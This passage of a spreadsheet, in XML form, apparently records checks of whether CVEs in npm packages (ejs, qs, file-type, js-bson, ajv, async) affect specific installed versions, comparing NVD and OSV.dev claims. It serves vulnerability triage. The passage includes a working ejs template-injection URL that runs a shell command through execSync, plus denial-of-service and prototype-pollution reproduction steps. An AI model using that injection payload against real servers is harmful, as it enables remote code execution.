            <text:p/>
            <text:p>&lt;h1&gt; You are viewing page number &lt;%= id %&gt;&lt;/h1&gt;</text:p>
            <text:p/>
            <text:p>Start the server, visit this link: http://localhost:4000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s    </text:p>
            <text:p/>
            <text:p>Then in your /tmp folder a file pwned will appear.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2017-1000048</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>qs:2.2.4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>NVD claims that the installed version 2.2.4 is not vulnerable while the OSV.dev claims, amongst other, that 0.0.0 - 6.0.4 is vulnerable.</text:p>
            <text:p/>
            <text:p>Install qs@6.0.4 and tape@latest via npm</text:p>
            <text:p/>
            <text:p>Create a file called test.js and put the content below inside</text:p>
            <text:p/>
            <text:p>const qs = require("qs");</text:p>
            <text:p>const test = require("tape");</text:p>
            <text:p>test('parse()', function (t) {</text:p>
            <text:p>        t.test('does not allow overwriting prototype properties', function (st) {</text:p>
            <text:p>                st.deepEqual(qs.parse('a[hasOwnProperty]=b', { allowPrototypes: false }), {});</text:p>
            <text:p>                st.deepEqual(qs.parse('hasOwnProperty=b', { allowPrototypes: false }), {});</text:p>
            <text:p/>
            <text:p>                st.deepEqual(</text:p>
            <text:p>                    qs.parse('toString', { allowPrototypes: false }),</text:p>
            <text:p>                    {},</text:p>
            <text:p>                    'bare "toString" results in {}'</text:p>
            <text:p>                );</text:p>
            <text:p/>
            <text:p>                st.end();</text:p>
            <text:p>        });</text:p>
            <text:p>});</text:p>
            <text:p/>
            <text:p>Run the file, all test will pass as 6.0.4 is fixed</text:p>
            <text:p/>
            <text:p>Now install qs@2.2.4 and re-run the file.</text:p>
            <text:p/>
            <text:p>Now a test will fail, indicating that the flaw still exists.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Async:0.9.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-36313</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>file-type:8.1.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv" xlink:type="simple">The API was completely re-written in version 13.0.0 and this introduced the vulnerability. Version 8.1.0, which is installed is not vulnerable as NVD claims.

Download the following file: https://github.com/sindresorhus/file-type/blob/main/fixture/fixture-corrupt.mkv

Install version 8.1.0 of file-type via npm. 
Then create a file called test.js. 
Put the following contents within it:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');
const buffer = fs.readFileSync(filePath);
fileType(buffer);

console.log("will finish")

Run the file using “node test.js” and the program will execute and terminate.

Next install 13.0.0 of file-type via npm.

Remove the file test.js and create a new one with the following contents:

const fileType = require('file-type');
const path = require("path");
const fs = require('fs');

const filePath = path.join(__dirname, 'fixture_fixture-corrupt.mkv');

fileType.fromFile(filePath);
console.log("will never finish");

Run the file using “node test.js” and the program will never finish.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2020-7610</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>js-bson:0.4.23</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/mongodb/js-bson/blob/528680fa751300364f7a939258b621740613f8ae/lib/bson/parser/serializer.js" xlink:type="simple">NVD claims that only versions &gt;= 1.0.0 &lt;1.1.4 are vulnerable while the OSV.dev claims that all versions &lt; 1.1.4 are vulnerable and thus also the installed version 0.4.23. 

The fix introduced in https://github.com/mongodb/js-bson/commit/6e782dac6a110509097077ee5edd311977f32522 in version 1.1.4 does not exist in version 0.4.23.

Version 0.4.23 still misses the cruicial check for the _bsontype and therefore is also vulnerable:
https://github.com/mongodb/js-bson/blob/528680fa751300364f7a939258b621740613f8ae/lib/bson/parser/serializer.js

Therefore OSV.dev is correct and version 0.4.23 is also vulnerable.</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Async:1.5.2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
            <text:p/>
            <text:p>https://github.com/caolan/async/blob/9ab5c67b7cb3a4c3dad4a2d4552a2f6775545d6c/lib/async.js</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-29078</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ejs:1.0.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://eslam.io/posts/ejs-server-side-template-injection-rce/" xlink:type="simple">The NVD claims that only version 3.1.6 of ejs is vulnerable whereas the OSV.dev claims versions 0 up to 3.1.7 (excluding) are vulnerable.

The vulnerable function still exists and therefore this version (1.0.0) is still affected. https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf#diff-18aff90313b014fc8148e052d4a3602eae9b81ae10c49d6f301fa61b14bffdbd</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2022-29078</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ejs:0.8.8 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://eslam.io/posts/ejs-server-side-template-injection-rce/" xlink:type="simple">The NVD claims that only version 3.1.6 of ejs is vulnerable whereas the OSV.dev claims versions 0 up to 3.1.7 (excluding) are vulnerable.

The vulnerable function still exists and therefore this version (0.8.8) is still affected. https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf#diff-18aff90313b014fc8148e052d4a3602eae9b81ae10c49d6f301fa61b14bffdbd</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>goof</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2020-15366</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ajv:6.10.2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/ajv-validator/ajv/commit/988982d3fde08e3ea074e8942442834e78c45587" xlink:type="simple">https://github.com/ajv-validator/ajv/commit/988982d3fde08e3ea074e8942442834e78c45587

The fix introduced in the commit above, changes code that existed like that since version 0.0.0 of ajv. NVD claims that only version 6.12.2 is vulnerable, which is wrong. 

See here version 0.5.0, which contains the flaw: https://github.com/ajv-validator/ajv/blob/5f36f17f63219bcceed2f2f1bf3e758eebe23444/lib/dot/dependencies.jst</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>durian</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2020-15366</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>ajv:6.12.0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/ajv-validator/ajv/commit/988982d3fde08e3ea074e8942442834e78c45587" xlink:type="simple">https://github.com/ajv-validator/ajv/commit/988982d3fde08e3ea074e8942442834e78c45587

The fix introduced in the commit above, changes code that existed like that since version 0.0.0 of ajv. NVD claims that only version 6.12.2 is vulnerable, which is wrong. 

See here version 0.5.0, which contains the flaw: https://github.com/ajv-validator/ajv/blob/5f36f17f63219bcceed2f2f1bf3e758eebe23444/lib/dot/dependencies.jst</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>dvws</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>CVE-2021-43138</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>async:1.5.2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>OSV.dev</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>not affected</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>vulnerable function mapValues/createObjectIterator did not exist in installed version of async</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="20"/>
          <table:table-cell table:number-columns-repeated="997"/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="972">
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="27"/>
          <table:table-cell table:number-columns-repeated="997"/>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quot;" svg:font-family="&quot;Arial&quot;"/>
    <style:font-face style:name="&quot;Liberation Sans&quot;" svg:font-family="'&quot;Liberation Sans&quot;'"/>
    <style:font-face style:name="Arial" svg:font-family="Arial"/>
    <style:font-face style:name="Cambria" svg:font-family="Cambria"/>
    <style:font-face style:name="Liberation Serif" svg:font-family="'Liberation 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4" style:display-name="PageStyle_Sheet4"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7" meta:object-count="0"/>
    <meta:generator>LibreOfficeDev/6.0.5.2$Linux_X86_64 LibreOffice_project/</meta:generator>
  </office:meta>
</office:document-meta>
</file>